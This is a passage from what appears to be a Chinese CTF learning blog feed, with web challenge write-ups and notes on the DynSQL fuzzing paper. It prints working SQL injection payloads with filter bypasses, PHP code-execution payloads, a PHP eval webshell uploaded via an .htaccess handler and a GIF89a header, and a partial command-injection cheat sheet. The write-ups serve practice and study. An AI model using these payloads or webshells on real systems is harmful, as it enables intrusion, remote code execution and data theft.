file!&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>php的弱类型比较，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p><p>所以这里只需要构造payload：?key&#x3D;123即可</p><h3 id="EaseCalc"><a href="#EaseCalc" class="headerlink" title="EaseCalc"></a>EaseCalc</h3><p><img src="/2024/02/01/WebWriteUp3/image-20240203205319202.png" alt="image-20240203205319202"></p><p>简单尝试，数字可以正常显示，字母会报错</p><p>查看源码：</p><p><img src="/2024/02/01/WebWriteUp3/image-20240203210016882.png" alt="image-20240203210016882"></p><p>大致就是通过ajax，向服务器发送表单，根据服务器返回的结果，不刷新网页，更新页面上的元素</p><p>看着有个calc.php，访问，得到以下代码</p><p><img src="/2024/02/01/WebWriteUp3/image-20240203205817503.png" alt="image-20240203205817503"></p><p>使用黑名单进行过滤</p><p>那么就需要对传参num和我们尝试访问的文件目录进行过滤</p><p>这里可以在传参时，在num前边加空格绕过字符检测<strong>因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</strong>（这个在我看来，有点类似后缀名绕过时候的xx.php.）</p><p>那么能传参之后，看着过滤了&#x2F;,那么猜测跟文件访问有关，那么如何绕过呢</p><p>利用<code>scandir</code> 函数，其用于获取指定目录中的文件和目录列表</p><p><code>scandir(chr(47))</code> 获取的是根目录 <code>/</code> 下的所有文件和目录的列表。<code>chr</code> 是一个 PHP 函数，用于返回指定 ASCII 值的字符。在这里，<code>chr(47)</code> 返回 ASCII 值为 47 的字符，即斜杠 <code>/</code>。所以，<code>chr(47)</code> 就是表示根目录 <code>/</code>。</p><p>构造payload，</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">/calc.php? num=<span class="hljs-number">1</span>; var<span class="hljs-constructor">_dump(<span class="hljs-params">scandir</span>(<span class="hljs-params">chr</span>(47)</span>));<br></code></pre></td></tr></table></figure><p><img src="/2024/02/01/WebWriteUp3/image-20240203213908903.png" alt="image-20240203213908903"></p><p>看到根目录下有个文件叫f1agg</p><p>利用<code>file_get_contents</code> 函数，用于获取文件的内容。</p><p>构造payload：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">/calc.php？  %<span class="hljs-number">20</span>num=var_dump(file_get_contents(<span class="hljs-built_in">chr</span>(<span class="hljs-number">47</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">102</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">49</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>)))<br></code></pre></td></tr></table></figure><p><img src="/2024/02/01/WebWriteUp3/image-20240203214043914.png" alt="image-20240203214043914"></p><p>得到flag</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DynSQL</title>
    <link href="/2024/01/30/DynSQL/"/>
    <url>/2024/01/30/DynSQL/</url>
    
    <content type="html"><![CDATA[<h2 id="DynSQL-Stateful-Fuzzing-for-Database-Management-Systems-with-Complex-and-Valid-SQL-Query-Generation"><a href="#DynSQL-Stateful-Fuzzing-for-Database-Management-Systems-with-Complex-and-Valid-SQL-Query-Generation" class="headerlink" title="DynSQL: Stateful Fuzzing for Database Management Systems with Complex and Valid SQL Query Generation"></a>DynSQL: Stateful Fuzzing for Database Management Systems with Complex and Valid SQL Query Generation</h2><p><strong>DynSQL：用于复杂且有效的SQL查询生成的数据库管理系统的有状态模糊测试</strong></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>DBMS通常在四个阶段处理每个语句：<strong>解析、优化、评估和执行</strong>。在解析阶段，DBMS首先根据其预定义的语法规则检查语句的语法正确性，然后根据当前数据库模式检查语义正确性。如果任何语法或语义检查失败，该语句将被直接丢弃，整个查询处理可能被终止。在后续阶段，DBMS优化语句的低级表达，并生成若干可能的执行计划。然后，DBMS评估每个执行计划的成本，并最终执行最有效的计划。语句执行后，DBMS更新状态，包括数据库模式和执行状态，然后处理查询中的下一个语句。</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>应用于DBMS的模糊测试技术，通过生成一系列SQL查询来测试DBMS的安全性一些模糊测试工具利用明确定义的规则随机生成SQL查询，将这些查询提供给目标DBMS，并检查是否触发了缺陷。还有一些方法涉及反馈机制：在每个测试用例执行之后，收集目标DBMS的运行时信息（例如代码覆盖率），并检查是否发生了改变或别的行为（例如覆盖了新的分支）。如果是这样，该测试用例将被存储为以后生成测试用例的种子。</p><h3 id="现状"><a href="#现状" class="headerlink" title="现状"></a><strong>现状</strong></h3><p>现有的数据库管理系统模糊测试工具在生成复杂且有效的查询方面仍然存在限制，难以发现DBMS中的深层次缺陷。</p><ul><li>复杂查询：包含多个涉及SQL特性的SQL语句，如多层嵌套子查询</li><li>有效查询：确保语法和语义的正确性</li></ul><p>如SQLsmith在每个查询中只生成一个语句，避免分析语句之间的依赖关系，牺牲了复杂性以换取有效性；SQUIRREL 使用中间表示（IR）模型推断依赖关系并生成包含多个语句的查询，但产生了超过50％的无效查询，并倾向于生成简单的语句</p><h4 id="成因"><a href="#成因" class="headerlink" title="成因"></a><strong>成因</strong></h4><p>现有工具严重依赖定义的语法模型和固定的先验知识，未关注其运行时状态。例如SQLsmith忽视了状态变化，SQUIRREL则是静态的推测其状态。在没有准确的状态信息的情况下，这些模糊测试工具倾向于在语句之间建立错误的依赖关系或滥用SQL特性，导致生成许多无效查询。为了生成有效的测试用例，这些模糊测试工具必须限制生成查询的复杂性，通过生成简单语句来避免这种状况。</p><h4 id="为什么生成复杂且有效的查询是具有挑战性的"><a href="#为什么生成复杂且有效的查询是具有挑战性的" class="headerlink" title="为什么生成复杂且有效的查询是具有挑战性的"></a><strong>为什么生成复杂且有效的查询是具有挑战性的</strong></h4><p><img src="/2024/01/30/DynSQL/image-20240131204350172.png" alt="image-20240131204350172"></p><p><strong>创建表t1：</strong> 创建了一个名为t1的表，其中包含一个名为f1的整数字段。</p><p><strong>创建视图v1：</strong> 创建了一个名为v1的视图，该视图的定义涉及三级嵌套的子SELECT语句。这个视图包含两个列c2和c4，其中c2和c4的值都来自子查询中的c4。</p><p><strong>WITH子句（公共表达式）：</strong> 使用WITH子句创建了一个名为cte_0的公共表达式，其中包含一个SELECT语句。这个SELECT语句使用两个子查询（subq_0和subq_1）和一个交叉连接（CROSS JOIN）来生成结果。</p><ul><li>子查询subq_0选择了视图v1中的列c4，并将其重命名为c6。</li><li>子查询subq_1选择了常量值11，并将其重命名为c4。</li><li>交叉连接将这两个子查询的结果组合在一起。</li></ul><p>什么是公共表达式</p><p>在单个语句的执行范围内定义的临时结果集</p><p><strong>查询：</strong> 执行一个简单的SELECT语句，选择常量值1。这个查询本身没有实际的目的，主要是作为一个最小的测试用例，用于触发服务器漏洞。</p><p>这是一个恶意查询，可以使MariaDB服务器崩溃并实现拒绝服务攻击，在DynSQL发现之前存在了超过5年，而显然，对于传统的模糊测试器来说，生成这样的查询语句以检测漏洞是非常难的</p><h3 id="本文解决方案"><a href="#本文解决方案" class="headerlink" title="本文解决方案"></a><strong>本文解决方案</strong></h3><p>DBMS逐条处理每个查询语句，并在执行每个语句后更改受操纵数据库的状态。在语句处理的间隔中，DBMS特定的状态信息，包括最新的数据库模式和语句处理状态，是可用的。</p><p>利用这个信息，本文提出了有状态的DBMS模糊测试框架，通过<strong>执行动态查询交互将查询生成和查询执行合并</strong>，而不是传统的在查询执行之前完成查询生成。这种方法将每个生成的语句提供给目标DBMS，然后在语句执行后动态与DBMS交互，收集最新的状态信息。收集到的状态信息用于指导后续语句的生成。为了提升有效性，收集关于查询执行的信息，并观察生成的查询是否通过目标DBMS的语法和语义检查。如果生成的查询触发了任何语法或语义错误，这些查询被标识为无效并被直接丢弃。这样能保证所有的种子都是有效的。</p><h2 id="DynSQL"><a href="#DynSQL" class="headerlink" title="DynSQL"></a>DynSQL</h2><p><img src="/2024/01/30/DynSQL/image-20240309144351266.png" alt="image-20240309144351266"></p><h3 id="动态查询交互"><a href="#动态查询交互" class="headerlink" title="动态查询交互"></a>动态查询交互</h3><h4 id="调度器（Scheduler）"><a href="#调度器（Scheduler）" class="headerlink" title="调度器（Scheduler）"></a>调度器（Scheduler）</h4><ul><li><strong>Input：</strong> 输入包括文件（<code>file</code>）和数据库管理系统（<code>DBMS</code>）。</li><li><strong>Output：</strong> 输出包括生成的查询语句（<code>query</code>）、目标数据库管理系统的代码覆盖率（<code>cov</code>）和查询处理的状态（<code>status</code>）。</li><li>Algorithm：<ol><li>初始化一些变量，包括文件大小、目标数据库管理系统、读取字节数、查询语句、代码覆盖率。</li><li>进入一个循环，循环将在所有文件字节被读取完毕后结束。</li><li>在每一轮循环中，首先查询目标数据库管理系统以获取最新的数据库模式。</li><li>将查询到的数据库模式、文件和已读取字节数传递给Translator翻译器，获得生成的SQL语句和更新后的已读取字节数。</li><li>将生成的SQL语句添加到查询语句中。</li><li>将生成的SQL语句发送给目标数据库管理系统，并收集执行该语句后的代码覆盖率和执行状态。</li><li>检查执行状态，如果检测到崩溃（<code>CRASH</code>）或其他异常错误，报告并结束循环。</li><li>当循环结束时，返回生成的查询语句、代码覆盖率和最终查询处理状态。</li></ol></li></ul><h4 id="翻译器（Translator）"><a href="#翻译器（Translator）" class="headerlink" title="翻译器（Translator）"></a>翻译器（Translator）</h4><ul><li><strong>Input：</strong> 输入包括数据库模式（<code>schema</code>）、文件（<code>file</code>）和已读取字节数（<code>rb</code>）。</li><li><strong>Output：</strong> 输出包括生成的SQL语句（<code>stmt</code>）和更新后的已读取字节数（<code>rb + tmp_rb</code>）。</li><li>Algorithm：<ol><li>从文件中提取未读取部分，并将其存储在<code>tmp_file</code>中。</li><li>使用内部的SQL语句生成器（<code>StmtGenerator</code>）根据提供的数据库模式和<code>tmp_file</code>生成SQL语句。</li><li>返回生成的SQL语句和已读取字节数的更新值。</li></ol></li></ul><p><img src="/2024/01/30/DynSQL/image-20240311141128983.png" alt="image-20240311141128983"></p><p>由于尚未处理任何语句，模式为空。调度器将空模式发送给翻译器。然后，翻译器遍历其AST模型，并根据从文件中读取的值生成一个CREATE TABLE语句。调度器将该语句馈送给DBMS，并收集语句处理的代码覆盖和状态。由于没有崩溃或错误，调度器进入下一轮交互。在第二轮中，调度器再次查询DBMS以获取最新的模式，然后将模式发送给翻译器。由于CREATE TABLE语句已执行，模式包含一个创建的表t1。翻译器首先删除已读取的文件部分，然后使用已处理的文件生成一个新语句，根据更新后的模式。它从文件中读取一些字节并生成一个包含表t1引用的CREATE VIEW语句。生成的语句再次馈送给DBMS，并正常处理，因此调度器进入第三轮。在第三轮中，调度器查询DBMS并获取最新的扩展了一个包含两列c2和c4的视图v1的模式。将此模式发送给翻译器，翻译器相应地生成一个带有CTE的SELECT语句，其中引用了模式中的视图v1。当调度器将生成的语句馈送给DBMS时，触发了一个崩溃，因此调度器终止交互并报告一个包含3个生成语句的触发漏洞的查询的漏洞。</p><p><img src="/2024/01/30/DynSQL/image-20240311141631981.png" alt="image-20240311141631981"></p><p>对于每个SQL查询的输入文件，我们的方法检查查询是否在执行过程中增加了代码覆盖率。如果查询导致DBMS在运行时覆盖新分支，我们的模糊测试方法将这些分支合并到全局覆盖中。对于每个增加了覆盖率的SQL查询的输入文件，我们的方法进一步检查查询是否使目标DBMS执行异常。如果DBMS报告任何错误，则将丢弃该输入文件以进行种子变异。通过这种方式，我们的模糊测试方法确保所有已识别的种子在用作动态查询交互的输入文件时都能生成有效的SQL查询。利用这些有效的种子，我们的种子变异在模糊测试期间实现了生成有效查询的高可能性。</p><p>实验结果：<br>对每个DBMS，进行5次模糊测试，使用24小时作为超时标准</p><p>found：发现的错误数量</p><p>confirm：开发人员确认</p><p>fix：开发人员修复</p><p>statement对象：不带参数的sql语句</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebWriteUp2</title>
    <link href="/2024/01/29/WebWriteUp2/"/>
    <url>/2024/01/29/WebWriteUp2/</url>
    
    <content type="html"><![CDATA[<h4 id="极客大挑战-LoveSQL"><a href="#极客大挑战-LoveSQL" class="headerlink" title="[极客大挑战]LoveSQL"></a>[极客大挑战]LoveSQL</h4><p><img src="/2024/01/29/WebWriteUp2/image-20240129193528686.png" alt="image-20240129193528686"></p><p><strong>判断注入类型</strong></p><p>尝试随便一个用户名，密码（1，2），有回显</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129193607847.png" alt="image-20240129193607847"></p><p>尝试1’ , 2‘，</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129194525961.png" alt="image-20240129194525961"></p><p>说明是字符型注入</p><p><strong>判断字段数</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span> <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>正确回显为：</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129200215904.png" alt="image-20240129200215904"></p><p>但测到4时</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129200235708.png" alt="image-20240129200235708"></p><p>说明有3个字段</p><p><strong>确定字段顺序</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240129201434511.png" alt="image-20240129201434511"></p><p>不难猜测，第二列放的是用户名，第三列放的是密码</p><p><strong>爆出当前数据库&#x2F;表信息</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1, group_concat(table_name),3  from information_schema.tables where table_schema=database() #</span><br></code></pre></td></tr></table></figure><p><code>SELECT 1, GROUP_CONCAT(table_name)，3 FROM information_schema.tables WHERE table_schema=database()</code>: 这是新的 SELECT 语句，它选择了三列。第一列是数字 1，第二列是使用 <code>GROUP_CONCAT(table_name)</code> 来获取当前数据库中所有表的表名，并将其以逗号分隔的形式合并。</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129202306472.png" alt="image-20240129202306472"></p><p>得到有两个表，看表名就大概猜测flag藏在了l0veysq1中</p><p>构造payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1, 2, group_concat(column_name) from information_schema.columns where table_name=&quot;l0ve1ysq1&quot; #</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240129202719431.png" alt="image-20240129202719431"></p><p>得到表信息</p><p>那id应该是没啥好看的，username和password一个个看</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs capnproto"><span class="hljs-number">2</span>&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, group_concat(username) <span class="hljs-keyword">from</span> l0ve1ysq1 <span class="hljs-comment">#</span><br><span class="hljs-number">2</span>&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, group_concat(password) <span class="hljs-keyword">from</span> l0ve1ysq1 <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>username结果：</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129203058464.png" alt="image-20240129203058464"></p><p>password结果：（flag在后边没有显示出来）</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129203226970.png" alt="image-20240129203226970"></p><p>从username中，可以看到flag在第16个</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">2</span>&#x27; union select <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, group_concat(password) <span class="hljs-keyword">from</span> l0ve1ysq1 <span class="hljs-keyword">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-number">16</span> <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240129203347091.png" alt="image-20240129203347091"></p><p>得到flag</p><h4 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h4><p><img src="/2024/01/29/WebWriteUp2/image-20240129204030753.png" alt="image-20240129204030753"></p><p>进去之后：</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129204143184.png" alt="image-20240129204143184"></p><p>题目是http，那抓个包看看</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129204449368.png" alt="image-20240129204449368"></p><p>发现在这里有个Secret.php，继续访问并抓包</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129204922741.png" alt="image-20240129204922741"></p><p>修改请求头</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129210432363.png" alt="image-20240129210432363"></p><p>提示不是用这个浏览器，修改User-Agent</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129210609473.png" alt="image-20240129210609473"></p><p>提示只能在本地，修改X-Forwarded-For</p><p><img src="/2024/01/29/WebWriteUp2/image-20240129210734419.png" alt="image-20240129210734419"></p><blockquote><p>X-Forwarded-For是一个 HTTP 头部字段，用于标识客户端的原始 IP 地址，当请求通过代理服务器或负载均衡器等中间设备时，这个头部字段可以包含多个 IP 地址，每个 IP 地址之间用逗号分隔。</p><p>例如：</p><p>X-Forwarded-For: client_ip, proxy1_ip, proxy2_ip</p><p><code>client_ip</code> 是最初的客户端 IP 地址，而 <code>proxy1_ip</code> 和 <code>proxy2_ip</code> 是经过的代理服务器的 IP 地址。这个头部字段的值是一个有序的列表，表示请求的路径。</p></blockquote><h4 id="极客大挑战-Upload"><a href="#极客大挑战-Upload" class="headerlink" title="[极客大挑战]Upload"></a>[极客大挑战]Upload</h4><p><img src="/2024/01/29/WebWriteUp2/image-20240130111913856.png" alt="image-20240130111913856"></p><p>先写个一句话木马，保存为webshell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;webshell&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上传试试</p><p><img src="/2024/01/29/WebWriteUp2/image-20240130152023401.png" alt="image-20240130152023401"></p><p>那么抓包修改content-type试试</p><p><img src="/2024/01/29/WebWriteUp2/image-20240130112036648.png" alt="image-20240130112036648"></p><p>检测了后缀名，这个的绕过可以使用一些不常用的后缀名，尝试后发现phpt和phpml都可以</p><p><img src="/2024/01/29/WebWriteUp2/image-20240130112235135.png" alt="image-20240130112235135"></p><p>&amp;#x3c和&amp;#x3F 是 HTML 中的实体编码，表示 Unicode 字符，分别代表 <code>&lt;</code> 和 <code>?</code> 字符。</p><p>说明检测了上传文件的内容，如果php格式被过滤的话，尝试.htaccess文件试试</p><blockquote><p>mac创建.htaccess文件的方法：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">defaults <span class="hljs-built_in">write</span> com.apple.finder AppleShowAllFiles -<span class="hljs-built_in">boolean</span> <span class="hljs-literal">true</span> ; killall Finder<br></code></pre></td></tr></table></figure><p>创建完，为了保护一些隐藏文件的安全：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">defaults <span class="hljs-built_in">write</span> com.apple.finder AppleShowAllFiles -<span class="hljs-built_in">boolean</span> <span class="hljs-literal">false</span> ; killall Finder<br></code></pre></td></tr></table></figure></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">&lt;FilesMatch &quot;shell&quot;&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>这个可以修改网页配置文件，让后边的名为shell的文件被当作php执行，把.htaccess文件上传</p><p><img src="/2024/01/29/WebWriteUp2/image-20240130154708383.png" alt="image-20240130154708383"></p><p>上传失败，说明应该是对文件头进行了检测，通过GIF89a进行绕过</p><p><img src="/2024/01/29/WebWriteUp2/image-20240130155710696.png" alt="image-20240130155710696"></p><p>成功上传</p><p>再创建一个，包含一句话木马，名为shell，不带后缀的文件，用同样方法上传后，使用蚁剑连接即可，flag在根目录下</p><p><img src="/2024/01/29/WebWriteUp2/image-20240130162424288.png" alt="image-20240130162424288"></p><p>还有中绕过&lt;?的方法，利用js+php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;蚁剑连接时的密码&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h4><p><img src="/2024/01/29/WebWriteUp2/image-20240130202934843.png" alt="image-20240130202934843"></p><p>随便上传一个，提示</p><p><img src="/2024/01/29/WebWriteUp2/image-20240130203012711.png" alt="image-20240130203012711"></p><p>禁用前端js试试</p><p><img src="/2024/01/29/WebWriteUp2/image-20240130203250380.png" alt="image-20240130203250380"></p><p>提示错误，抓包重放试试</p><p>有了上一题的经验，这题就很简单了</p><p><img src="/2024/01/29/WebWriteUp2/image-20240130203512966.png" alt="image-20240130203512966"></p><p>上传成功之后用蚁剑连接,flag在根目录下</p><h4 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h4><p><img src="/2024/01/29/WebWriteUp2/image-20240131205347324.png" alt="image-20240131205347324"></p><p>还是这个熟悉的界面</p><p><strong>判断注入类型</strong></p><p>使用1，2进行测试，提示用户名密码错误</p><p>使用1，2‘进行测试，说明注入为字符型</p><p><img src="/2024/01/29/WebWriteUp2/image-20240131205636587.png" alt="image-20240131205636587"></p><p>确定字段数：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240131211123806.png" alt="image-20240131211123806"></p><p>看报错，发现union,select不见了，应该是被直接替换成了空字符，那么修改payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>&#x27; uniunionon seselectlect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240131211247245.png" alt="image-20240131211247245"></p><p>成功绕过，且测试后发现只有三个字段</p><p>爆库（跟LoveSQL一样）</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">2</span>&#x27; uniunionon seselectlect <span class="hljs-number">1</span>, group_concat(table_name),<span class="hljs-number">3</span>  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=database() <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240131211614641.png" alt="image-20240131211614641"></p><p>还存在过滤，继续修改payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>&#x27; uniunionon seselectlect <span class="hljs-number">1</span>, group_concat(table_name),<span class="hljs-number">3</span>  frfromom infoorrmation_schema.tables whwhereere table_schema=database() #<br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240131211821990.png" alt="image-20240131211821990"></p><p>那么尝试爆b4bsql这个库中的表</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>&#x27; uniunionon selselectect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;b4bsql&#x27;#<br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240131212010267.png" alt="image-20240131212010267"></p><p>成功爆出表的内容</p><p>爆数据，根据经验，猜测在password中</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>&#x27; ununionion seselectlect <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, group_concat(passwoorrd) frfromom b4bsql #<br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240131212239814.png" alt="image-20240131212239814"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>&#x27; ununionion seselectlect <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, group_concat(passwoorrd) frfromom b4bsql whwhereere id=<span class="hljs-number">8</span>#<br></code></pre></td></tr></table></figure><p><img src="/2024/01/29/WebWriteUp2/image-20240131212348021.png" alt="image-20240131212348021"></p><p>得到flag</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令注入总结</title>
    <link href="/2024/01/29/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <url>/2024/01/29/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="命令行注入"><a href="#命令行注入" class="headerlink" title="命令行注入"></a>命令行注入</h2><p>命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞</p><h3 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h3><p>PHP:</p><ul><li>System</li><li>exec</li><li>passthru</li><li>Shell_exec</li><li>popen</li><li>Proc_open</li></ul><p>Python:</p><ul><li>system</li><li>popen</li><li>Subprocess.call</li><li>spawn</li></ul><h3 id="常见注入方式"><a href="#常见注入方式" class="headerlink" title="常见注入方式"></a>常见注入方式</h3><p><strong>分号(;)</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ping <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-comment">;ls</span><br></code></pre></td></tr></table></figure><p>多条语句顺序执行</p><p><strong>管道符(|)</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd1 <span class="hljs-string">| cmd2</span><br></code></pre></td></tr></table></figure><p>cmd1命令的输出作为cmd2的参数</p><p><strong>and(&amp;&amp;)</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd1 <span class="hljs-meta">&amp;&amp; cmd2</span><br></code></pre></td></tr></table></figure><p><strong>or(||)</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd1 <span class="hljs-string">|| cmd2</span><br></code></pre></td></tr></table></figure><p>cmd1成功执行则不执行cmd2</p><p><strong>反引号(&#96;&#96;)和$()</strong></p><p>被反引号以及$()扩起来的字符串，都会被当作命令首先执行</p><h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a><strong>绕过空格</strong></h4><ul><li>${IFS}</li><li>${IFS}$1</li><li>&lt;</li><li>&lt;&gt;</li><li>%09（需要php环境）</li></ul><h4 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a><strong>绕过黑名单</strong></h4><p><strong>拼接绕过</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span 